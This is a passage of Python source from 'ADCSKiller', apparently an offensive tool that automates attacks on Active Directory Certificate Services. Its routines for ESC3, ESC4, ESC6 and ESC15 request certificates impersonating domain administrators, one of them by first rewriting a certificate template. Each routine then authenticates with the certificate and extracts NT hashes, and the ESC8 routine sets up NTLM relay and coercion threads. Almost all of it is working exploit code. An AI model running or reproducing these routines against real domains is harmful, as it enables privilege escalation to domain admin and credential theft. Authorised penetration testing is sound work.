                            self.logger.info(f"Requesting certificate for {admin} using agent certificate")
                            
                            agent_cmd = [
                                "certipy", "req",
                                *auth_args.split(),
                                "-target", self.target,
                                "-ca", self.ca,
                                "-template", "User",  # Use User template for on-behalf-of requests
                                "-on-behalf-of", f"{self.domain}\\{admin}",
                                "-pfx", str(agent_cert),
                                "-out", f"{admin}_via_agent",
                                "-key-size", "4096"
                            ]
                            
                            # Add LDAP options
                            if self.use_ldaps:
                                agent_cmd.extend(["-ldap-scheme", "ldaps"])
                                if not self.ldap_channel_binding:
                                    agent_cmd.append("-no-ldap-channel-binding")
                            else:
                                agent_cmd.extend(["-ldap-scheme", "ldap"])
                            
                            try:
                                agent_result = subprocess.run(
                                    agent_cmd,
                                    capture_output=True,
                                    text=True,
                                    cwd=self.output_dir,
                                    timeout=120
                                )
                                
                                if "Got certificate" in agent_result.stdout:
                                    self.logger.info(f"Got certificate for {admin} via agent certificate (ESC3)")
                                    
                                    # Try to authenticate with the certificate
                                    admin_cert = self.output_dir / f"{admin}_via_agent.pfx"
                                    if admin_cert.exists():
                                        auth_cmd = [
                                            "certipy", "auth",
                                            "-pfx", str(admin_cert),
                                            "-domain", self.domain,
                                            "-username", admin,
                                            "-dc-ip", self.target
                                        ]
                                        
                                        auth_result = subprocess.run(
                                            auth_cmd,
                                            capture_output=True,
                                            text=True,
                                            timeout=60
                                        )
                                        
                                        if "Got hash for" in auth_result.stdout:
                                            hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                            if hash_match:
                                                nt_hash = hash_match.group(1)
                                                self.logger.info(f"Received NT hash for {admin} via ESC3: {nt_hash}")
                                else:
                                    self.logger.warning(f"Failed to get certificate for {admin} via agent (ESC3): {agent_result.stdout}")
                                    
                            except subprocess.TimeoutExpired:
                                self.logger.error(f"Agent certificate request timed out for {admin} (ESC3)")
                            except Exception as e:
                                self.logger.error(f"Agent certificate request failed for {admin} (ESC3): {e}")
                else:
                    self.logger.warning(f"Failed to get enrollment agent certificate (ESC3): {result.stdout}")
                    
            except subprocess.TimeoutExpired:
                self.logger.error(f"Enrollment agent certificate request timed out (ESC3)")
            except Exception as e:
                self.logger.error(f"Enrollment agent certificate request failed (ESC3): {e}")
    
    def exploit_esc4(self):
        """Exploit ESC4 vulnerability (Template Access Control)"""
        if "ESC4" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC4 vulnerability")
        
        for template in self.vulnerable_certificate_templates["ESC4"]:
            self.logger.info(f"Attempting to modify template {template} for ESC4 exploitation")
            
            auth_args = self.auth_manager.get_certipy_auth_args()
            
            try:
                # Apply ESC1 configuration to make template vulnerable
                modify_cmd = [
                    "certipy", "template",
                    *auth_args.split(),
                    "-dc-ip", self.target,
                    "-template", template,
                    "-write-default-configuration",
                    "-force"  # Skip confirmation prompts
                ]
                
                # Add LDAP options
                if self.use_ldaps:
                    modify_cmd.extend(["-ldap-scheme", "ldaps"])
                    if not self.ldap_channel_binding:
                        modify_cmd.append("-no-ldap-channel-binding")
                else:
                    modify_cmd.extend(["-ldap-scheme", "ldap"])
                
                self.logger.debug(f"Running template modification command: {' '.join(modify_cmd)}")
                
                modify_result = subprocess.run(
                    modify_cmd,
                    capture_output=True,
                    text=True,
                    timeout=15  # Reduce timeout further
                )
                
                if modify_result.returncode == 0:
                    self.logger.info(f"Successfully modified template {template} for ESC1 exploitation")
                    
                    # Now exploit it like ESC1
                    for admin in self.domain_admins:
                        self.logger.info(f"Requesting certificate for {admin} using modified template {template}")
                        
                        cmd = [
                            "certipy", "req",
                            *auth_args.split(),
                            "-target", self.target,
                            "-ca", self.ca,
                            "-template", template,
                            "-upn", admin,
                            "-out", f"{template}_{admin}_esc4",
                            "-key-size", "4096"
                        ]
                        
                        # Add LDAP options
                        if self.use_ldaps:
                            cmd.extend(["-ldap-scheme", "ldaps"])
                            if not self.ldap_channel_binding:
                                cmd.append("-no-ldap-channel-binding")
                        else:
                            cmd.extend(["-ldap-scheme", "ldap"])
                        
                        try:
                            result = subprocess.run(
                                cmd,
                                capture_output=True,
                                text=True,
                                cwd=self.output_dir,
                                timeout=120
                            )
                            
                            if "Got certificate" in result.stdout:
                                self.logger.info(f"Got certificate for {admin} using modified template (ESC4)")
                                
                                # Try to authenticate with the certificate
                                cert_file = self.output_dir / f"{template}_{admin}_esc4.pfx"
                                if cert_file.exists():
                                    auth_cmd = [
                                        "certipy", "auth",
                                        "-pfx", str(cert_file),
                                        "-domain", self.domain,
                                        "-username", admin,
                                        "-dc-ip", self.target
                                    ]
                                    
                                    auth_result = subprocess.run(
                                        auth_cmd,
                                        capture_output=True,
                                        text=True,
                                        timeout=60
                                    )
                                    
                                    if "Got hash for" in auth_result.stdout:
                                        hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                        if hash_match:
                                            nt_hash = hash_match.group(1)
                                            self.logger.info(f"Received NT hash for {admin} via ESC4: {nt_hash}")
                            else:
                                self.logger.warning(f"Failed to get certificate for {admin} (ESC4): {result.stdout}")
                                
                        except subprocess.TimeoutExpired:
                            self.logger.error(f"Certificate request timed out for {admin} (ESC4)")
                        except Exception as e:
                            self.logger.error(f"Certificate request failed for {admin} (ESC4): {e}")
                    
                    # Restore original template configuration from backup
                    backup_file = f"{template}.json"
                    if Path(backup_file).exists():
                        restore_cmd = [
                            "certipy", "template",
                            *auth_args.split(),
                            "-dc-ip", self.target,
                            "-template", template,
                            "-write-configuration", backup_file
                        ]
                        
                        # Add LDAP options
                        if self.use_ldaps:
                            restore_cmd.extend(["-ldap-scheme", "ldaps"])
                            if not self.ldap_channel_binding:
                                restore_cmd.append("-no-ldap-channel-binding")
                        else:
                            restore_cmd.extend(["-ldap-scheme", "ldap"])
                        
                        restore_result = subprocess.run(
                            restore_cmd,
                            capture_output=True,
                            text=True,
                            timeout=60
                        )
                        
                        if restore_result.returncode == 0:
                            self.logger.info(f"Successfully restored template {template} configuration")
                        else:
                            self.logger.warning(f"Failed to restore template {template} configuration")
                    else:
                        self.logger.warning(f"No backup file found for template {template} - cannot restore")
                        
                else:
                    self.logger.warning(f"Failed to modify template {template} (ESC4)")
                    self.logger.debug(f"Template modification stdout: {modify_result.stdout}")
                    self.logger.debug(f"Template modification stderr: {modify_result.stderr}")
                    self.logger.debug(f"Return code: {modify_result.returncode}")
                    
            except subprocess.TimeoutExpired:
                self.logger.error(f"Template modification timed out for {template} (ESC4)")
                self.logger.warning(f"Skipping ESC4 exploitation for template {template} due to timeout")
            except Exception as e:
                self.logger.error(f"Template modification failed for {template} (ESC4): {e}")
    
    def exploit_esc6(self):
        """Exploit ESC6 vulnerability (EDITF_ATTRIBUTESUBJECTALTNAME2)"""
        if "ESC6" not in self.vulnerabilities:
            return
        
        self.logger.info("Exploiting ESC6 vulnerability")
        
        # ESC6 allows us to request certificates with arbitrary SANs
        # We'll try to get certificates for domain admins by specifying their UPN in SAN
        for admin in self.domain_admins:
            # Find a template that allows low-privileged enrollment
            enrollable_templates = []
            for esc_type, templates in self.vulnerable_certificate_templates.items():
                if esc_type != "ESC6":
                    enrollable_templates.extend(templates)
            
            # If no other vulnerable templates, try common templates
            if not enrollable_templates:
                enrollable_templates = ["User", "Machine", "WebServer"]
            
            for template in enrollable_templates[:3]:  # Try first 3 templates only
                self.logger.info(f"Requesting certificate for {admin} using template {template} with ESC6")
                
                auth_args = self.auth_manager.get_certipy_auth_args()
                
                cmd = [
                    "certipy", "req",
                    *auth_args.split(),
                    "-target", self.target,
                    "-ca", self.ca,
                    "-template", template,
                    "-upn", f"{admin}@{self.domain}",
                    "-out", f"{template}_{admin}_esc6",
                    "-key-size", "4096"
                ]
                
                # Add LDAP options
                if self.use_ldaps:
                    cmd.extend(["-ldap-scheme", "ldaps"])
                    if not self.ldap_channel_binding:
                        cmd.append("-no-ldap-channel-binding")
                else:
                    cmd.extend(["-ldap-scheme", "ldap"])
                
                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        cwd=self.output_dir,
                        timeout=120
                    )
                    
                    if "Got certificate" in result.stdout:
                        self.logger.info(f"Got certificate for {admin} using template {template} (ESC6)")
                        
                        # Try to authenticate with the certificate
                        cert_file = self.output_dir / f"{template}_{admin}_esc6.pfx"
                        if cert_file.exists():
                            auth_cmd = [
                                "certipy", "auth",
                                "-pfx", str(cert_file),
                                "-domain", self.domain,
                                "-username", admin,
                                "-dc-ip", self.target
                            ]
                            
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for {admin} via ESC6: {nt_hash}")
                                    break  # Success, no need to try other templates
                    else:
                        self.logger.debug(f"Failed to get certificate for {admin} using template {template} (ESC6): {result.stdout}")
                        
                except subprocess.TimeoutExpired:
                    self.logger.error(f"Certificate request timed out for {admin} using template {template} (ESC6)")
                except Exception as e:
                    self.logger.error(f"Certificate request failed for {admin} using template {template} (ESC6): {e}")
    
    def exploit_esc15(self):
        """Exploit ESC15 vulnerability (EKUwu - Schema Version 1 Templates)"""
        if "ESC15" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC15 vulnerability (EKUwu)")
        
        for admin in self.domain_admins:
            for template in self.vulnerable_certificate_templates["ESC15"]:
                self.logger.info(f"Requesting certificate for {admin} using template {template} (ESC15 - EKUwu)")
                
                # ESC15 (EKUwu) - exploit Schema Version 1 templates by requesting with UPN
                admin_upn = f"{admin}@{self.domain}" if "@" not in admin else admin
                self.logger.debug(f"Attempting ESC15 for {admin_upn} using template {template}")
                
                # For ESC15, we don't need -application-policies, just request normally
                success, result = self.request_certificate_with_fallback(
                    admin_upn, template, "_esc15"
                )
                
                if success:
                    # Try to authenticate with the certificate
                    cert_file = self.output_dir / f"{template}_{admin_upn}_esc15.pfx"
                    if cert_file.exists():
                        auth_cmd = [
                            "certipy", "auth",
                            "-pfx", str(cert_file),
                            "-domain", self.domain,
                            "-username", admin,
                            "-dc-ip", self.target
                        ]
                        
                        try:
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for {admin} via ESC15: {nt_hash}")
                            
                            # Also note LDAP shell capability
                            self.logger.info(f"Certificate for {admin} can be used for LDAP authentication (ESC15)")
                            
                        except subprocess.TimeoutExpired:
                            self.logger.error(f"Certificate authentication timed out for {admin} (ESC15)")
                        except Exception as e:
                            self.logger.error(f"Certificate authentication failed for {admin} (ESC15): {e}")
                else:
                    if result:
                        self.logger.warning(f"Failed to get certificate for {admin} (ESC15) using all enrollment methods")
                    else:
                        self.logger.error(f"Failed to get certificate for {admin} (ESC15) - all enrollment methods failed")
    
    def exploit_esc8(self):
        """Exploit ESC8 vulnerability"""
        if "ESC8" not in self.vulnerabilities:
            return
        
        self.logger.info("Exploiting ESC8 vulnerability")
        
        if not self.ca_dns or not self.domain_controllers:
            self.logger.error("Missing required information for ESC8 exploitation")
            return
        
        # Determine target DC for coercion
        target_dc = None
        if self.ca_dns not in self.domain_controllers:
            # CA is not a DC, use first available DC
            target_dc = self.domain_controllers[0] if self.domain_controllers else self.target
            self.logger.info(f"Certificate authority {self.ca_dns} is not a domain controller")
        elif len(self.domain_controllers) >= 2:
            # CA is a DC, use different DC for coercion
            for dc in self.domain_controllers:
                if dc != self.ca_dns:
                    target_dc = dc
                    break
            self.logger.info(f"Certificate authority is a domain controller")
        else:
            self.logger.warning("Cannot perform ESC8 - insufficient domain controllers")
            return
        
        if not target_dc:
            self.logger.error("No suitable target DC found for ESC8")
            return
        
        # Start certipy relay
        certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.ca_dns)
        certipy_thread.daemon = True
        certipy_thread.start()
        
        # Wait for relay to initialize
        self.logger.info("Waiting 5 seconds for Certipy relay setup")
        time.sleep(5)
        
        # Start coercion
        coercer_thread = Coercer(2, "CoercerThread", self.auth_manager, target_dc, self.lhost)
        coercer_thread.daemon = True
        coercer_thread.start()
        
        # Wait for coercion to complete
        coercer_thread.join(timeout=300)  # 5 minute timeout
        
        if coercer_thread.is_alive():
            self.logger.warning("Coercion thread still running after timeout")
    
    def run_exploits(self):
        """Run appropriate exploits based on discovered vulnerabilities"""
        self.logger.info("Starting exploit execution")
        
        # Certificate template exploits
        certificate_exploits = {
            "ESC1": self.exploit_esc1,
            "ESC2": self.exploit_esc2,
            "ESC3": self.exploit_esc3,
            "ESC4": self.exploit_esc4,
            "ESC15": self.exploit_esc15,
        }
        
        # Environment/CA exploits
        environment_exploits = {
            "ESC6": self.exploit_esc6,
            "ESC8": self.exploit_esc8,
        }
        
        # Run template-based exploits
        for vuln in self.vulnerable_certificate_templates:
            if vuln in certificate_exploits:
                try:
                    certificate_exploits[vuln]()
                except Exception as e:
                    self.logger.error(f"Error exploiting {vuln}: {e}")
        
        # Run environment-based exploits
        for vuln in self.vulnerabilities:
            if vuln in environment_exploits:
                try:
                    environment_exploits[vuln]()
                except Exception as e:
                    self.logger.error(f"Error exploiting {vuln}: {e}")
    
    def cleanup(self):
        """Cleanup resources"""
        if hasattr(self, 'ldap_connection'):
            self.ldap_connection.close()


def main():
    banner = """
    
        ▄▄▄      ▓█████▄  ▄████▄    ██████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███     
        ▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   
        ▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   
        ░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     
        ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   
        ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
        ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░   
        ░   ▒    ░ ░  ░ ░        ░  ░  ░  ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░    
            ░  ░   ░    ░ ░            ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░        
                ░      ░                                                               

        """
    
    print(banner)
    print("ADCSKiller v0.4 - Enhanced ADCS Exploitation Tool")
    print("by Maurice Fielenbach (grimlockx) - Updated by Paul Seekamp (nullenc0de)")
    print()
    
    parser = argparse.ArgumentParser(
        description="ADCS exploitation automation with enhanced LDAPS support"
    )
    
    # Required arguments
    parser.add_argument('-d', '--domain', required=True, 
                       help='Target domain name (FQDN)')
    parser.add_argument('-u', '--username', required=True,
                       help='Username for authentication')
    parser.add_argument('-dc-ip', '--target', required=True,
                       help='IP address of the domain controller')
    parser.add_argument('-L', '--lhost', required=True,
                       help='FQDN of the listener machine')
    
    # Authentication options
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password',
                           help='Password for authentication')
    auth_group.add_argument('-H', '--hash',
                           help='NTLM hash for authentication (LM:NT format)')
    auth_group.add_argument('-K', '--kerberos-ticket',
                           help='Path to Kerberos ticket file')
    auth_group.add_argument('-A', '--aes-key',
                           help='AES key for Kerberos authentication')
    
    # LDAP options
    parser.add_argument('--ldaps', action='store_true',
                       help='Use LDAPS instead of LDAP (port 636)')
    parser.add_argument('--ldap-channel-binding', action='store_true',
                       help='Use LDAP channel binding (requires LDAPS)')
    parser.add_argument('--ldap-port', type=int,
                       help='Custom LDAP port (default: 389 for LDAP, 636 for LDAPS)')
    
    # Additional options
    parser.add_argument('-o', '--output', default='.',
                       help='Output directory (default: current directory)')
    parser.add_argument('--timeout', type=int, default=100,
                       help='Timeout for LDAP operations (default: 100)')
    parser.add_argument('--dns-tcp', action='store_true',
                       help='Use TCP for DNS queries')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug mode for certipy commands')
    parser.add_argument('--use-kerberos', action='store_true',
                       help='Force Kerberos authentication when using password')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.ldap_channel_binding and not args.ldaps:
        parser.error("--ldap-channel-binding requires --ldaps")
    
    # Determine authentication method
    password = args.password
    ntlm_hash = args.hash
    kerberos_ticket = args.kerberos_ticket
    aes_key = args.aes_key
    
    # Format NTLM hash if provided
    if ntlm_hash:
        if ':' not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
        elif ntlm_hash.startswith(':'):
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee{ntlm_hash}"
    
    try:
        # Initialize exploit class
        exploit = ADCSExploit(
            domain=args.domain,
            username=args.username,
            password=password,
            ntlm_hash=ntlm_hash,
            target=args.target,
            lhost=args.lhost,
            use_ldaps=args.ldaps,
            ldap_channel_binding=args.ldap_channel_binding,
            output_dir=args.output,
            verbose=args.verbose,
            dns_tcp=args.dns_tcp,
            timeout=args.timeout,
            debug=args.debug
        )
        
        # Set Kerberos ticket if provided
        if kerberos_ticket:
            exploit.auth_manager.kerberos_ticket = kerberos_ticket
        if aes_key:
            exploit.auth_manager.aes_key = aes_key
        if args.use_kerberos:
            exploit.auth_manager.use_kerberos = True
        
        # Run exploitation workflow
        if exploit.get_certipy_results():
            if exploit.bind_to_ldap():
                exploit.get_domain_admins()
                exploit.get_domain_controllers()
                exploit.fetch_certipy_results()
                exploit.run_exploits()
            else:
                logging.error("Failed to establish LDAP connection")
        else:
            logging.error("Failed to get certipy results")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        if 'exploit' in locals():
            exploit.cleanup()


if __name__ == "__main__":
    main()
